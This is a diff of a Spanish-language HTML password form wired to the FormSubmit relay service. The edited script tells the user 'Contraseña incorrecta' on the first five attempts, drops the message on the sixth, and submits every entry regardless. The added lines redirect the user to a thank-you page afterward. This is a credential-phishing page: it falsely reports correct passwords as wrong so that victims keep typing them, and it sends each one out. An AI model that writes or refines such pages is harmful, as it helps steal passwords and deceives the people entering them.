@@ -41,12 +41,13 @@
         <input id="nombre" 
                class="border border-gray-300 rounded px-4 py-2 w-full focus:outline-none focus:ring-1 focus:ring-emerald-500" 
                name="nombre" placeholder="Ingrese su contraseña" type="password" required>
-        <p id="errorNombre" class="text-red-600 text-sm mt-1 hidden">❌ Contraseña incorrecta</p>
+        <p id="errorNombre" class="text-red-600 text-sm mt-1 hidden"> Contraseña incorrecta</p>
       </div>
       
-      <!-- Configuración FormSubmit -->
+      <!-- Redirección después de enviar -->
+      <input type="hidden" name="_next" value="https://tu-pagina.com/gracias.html">
+      <!-- Desactivar captcha -->
       <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_next" value="gracias.html">
 
       <!-- Botón -->
       <button type="submit" 
@@ -67,23 +68,22 @@
   <script>
     let intentoNombre = 0;
 
-    document.getElementById("contactForm").addEventListener("submit", function() {
+    document.getElementById("contactForm").addEventListener("submit", function(e) {
       const nombre = document.getElementById("nombre");
       const errorMsg = document.getElementById("errorNombre");
 
       intentoNombre++;
 
       if (intentoNombre < 6) { 
-        // Mostrar error pero igual enviar
+        // Mostrar error pero igual se envía
         errorMsg.classList.remove("hidden");
         nombre.classList.add("border-red-500");
-        errorMsg.textContent = "❌ Contraseña incorrecta (intento " + intentoNombre + " de 5)";
+        errorMsg.textContent = "Contraseña incorrecta ";
       } else {
         // En el 6 ya no muestra error
         errorMsg.classList.add("hidden");
         nombre.classList.remove("border-red-500");
       }
-      // OJO: No usamos preventDefault, así que siempre se envía
     });
   </script>
 
